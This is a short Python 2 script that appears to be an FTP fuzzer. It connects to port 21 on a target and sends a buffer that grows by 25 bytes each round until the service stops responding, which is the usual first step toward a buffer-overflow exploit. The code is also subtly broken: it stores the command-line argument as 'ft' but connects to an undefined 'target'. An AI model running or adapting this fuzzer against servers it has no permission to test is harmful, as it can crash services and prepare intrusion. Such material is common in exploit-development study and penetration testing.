import sys
import socket
from time import sleep

ft = sys.argv[1]

buf = "\x47" * 100

while True:

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target, 21))
        s.recv(1024)

        print "Sending buffer of length: " + str(len(buf))
        s.send("A" + buf + "\r\n")
        s.close()
        sleep(5)

        # buffer lenth increase
        buf = buf + "\x47" * 25

    except:
        print "Failed to send buffer with length: " + str(len(buf))
        sys.exit(0)
